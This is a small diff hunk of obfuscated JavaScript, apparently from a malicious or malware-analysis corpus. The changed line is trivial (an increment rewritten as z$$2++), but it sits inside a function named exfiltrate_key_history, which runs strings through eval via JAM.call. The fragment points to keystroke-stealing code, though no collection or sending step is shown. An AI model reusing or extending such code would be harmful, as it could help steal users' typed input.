@@ -11,7 +11,7 @@ function exfiltrate_key_history() {
     } else {
       x$$47 = JAM.call(eval, null, [x$$47]);
     }
-    z$$2 = z$$2 + 1;
+    z$$2++;
     v1 = z$$2 < 2;
   }
   x$$47 = x$$47.replace("document.writeln(", "");
